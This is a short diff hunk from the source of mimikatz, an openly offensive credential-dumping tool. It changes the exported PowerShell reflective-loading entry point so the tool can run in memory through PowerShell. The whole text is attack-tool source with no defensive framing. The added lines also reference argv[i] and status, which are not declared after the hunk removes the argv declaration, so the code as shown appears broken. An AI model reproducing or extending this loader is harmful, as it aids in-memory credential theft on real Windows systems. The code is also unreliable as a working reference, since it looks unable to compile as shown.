@@ -240,17 +240,16 @@ NTSTATUS mimikatz_doLocal(wchar_t * input)
 #if defined(_POWERKATZ)
 __declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
 {
-	int argc = 0;
-	wchar_t ** argv;
+	mimikatz_begin();
 	
-	if(argv = CommandLineToArgvW(input, &argc))
-	{
-		outputBufferElements = 0xff;
-		outputBufferElementsPosition = 0;
-		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
-			wmain(argc, argv);
-		LocalFree(argv);
+	outputBufferElements = 0xff;
+	outputBufferElementsPosition = 0;
+	if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t))) {
+		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", input);
+		status = mimikatz_dispatchCommand(argv[i]);
 	}
+
+	mimikatz_end(status);
 	return outputBuffer;
 }
 #endif
